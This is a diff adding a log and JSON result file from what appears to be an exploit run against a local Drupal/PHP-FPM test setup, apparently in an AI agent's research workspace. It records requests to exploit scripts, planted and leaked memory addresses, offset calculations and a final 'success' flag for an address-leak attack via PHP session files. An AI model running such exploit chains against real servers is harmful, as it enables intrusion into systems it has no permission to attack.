@@ -1,0 +1,63 @@
+[02:05:38] master=172056 worker0=172058
+[02:05:38] POST /exploit/sess.php status=200 sent=80 ms=9 err=None
+[02:05:39] plant P=0x7f086b482000 B0=0x7f086b490000 heap=0x7f086b400040
+[02:05:39] POST /exploit/sess.php status=502 sent=222 ms=26 err=None
+[02:05:40] GET /sites/default/files/php/sessions/sess_tb1 status=200 len=86282
+[02:05:40] K=0x7f086b485000 offsets={'K-P': 12288, 'K-B0': -45056, 'B0-K': 45056, 'K-X': 86016, 'K-S_dest': 94144, 'P-K': -12288, 'X-K': -86016, 'S_dest-K': -94144} formula={'P_formula': 139674136354816, 'P_match': True, 'X_formula': 139674136281088, 'X_match': True, 'S_dest_formula': 139674136272960, 'S_dest_match': True, 'B0_formula': 139674136412160, 'B0_match': True}
+[02:05:40] POST /exploit/sess.php status=200 sent=80 ms=2 err=None
+[02:05:41] POST /exploit/trigger.php status=200 sent=222 ms=2 err=None
+[02:05:42] POST /exploit/health.php status=200 sent=80 ms=0 err=None
+{
+ "label": "r2",
+ "master": 172056,
+ "worker0": 172058,
+ "P_plant": 139674136354816,
+ "B0_plant": 139674136412160,
+ "heap": 139674135822400,
+ "K_dest": 139674136367104,
+ "offsets": {
+  "K-P": 12288,
+  "K-B0": -45056,
+  "B0-K": 45056,
+  "K-X": 86016,
+  "K-S_dest": 94144,
+  "P-K": -12288,
+  "X-K": -86016,
+  "S_dest-K": -94144
+ },
+ "formula_check": {
+  "P_formula": 139674136354816,
+  "P_match": true,
+  "X_formula": 139674136281088,
+  "X_match": true,
+  "S_dest_formula": 139674136272960,
+  "S_dest_match": true,
+  "B0_formula": 139674136412160,
+  "B0_match": true
+ },
+ "leak_get": {
+  "status": 200,
+  "len": 86282,
+  "attempt": 1
+ },
+ "leak_len": 86282,
+ "leak_sha1": "66238634e197fa13cd9f9429e7e4695df3caca34",
+ "worker_before_final": 172088,
+ "final_plant": {
+  "status": 200,
+  "head": "<br />\n<b>Fatal error</b>:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 20480 bytes) in <b>/tmp/opencode/research/drupal_fpm_20261022T013000Z/www/exploit/sess.php</b> on line <b>"
+ },
+ "final_trigger": {
+  "status": 200,
+  "head": "trigger-ok\n"
+ },
+ "marker_after": true,
+ "worker_after_final_trigger": 172088,
+ "worker_after_health": 172088,
+ "health": {
+  "status": 200,
+  "head": "health-ok\n"
+ },
+ "survived": true,
+ "success": true
+}
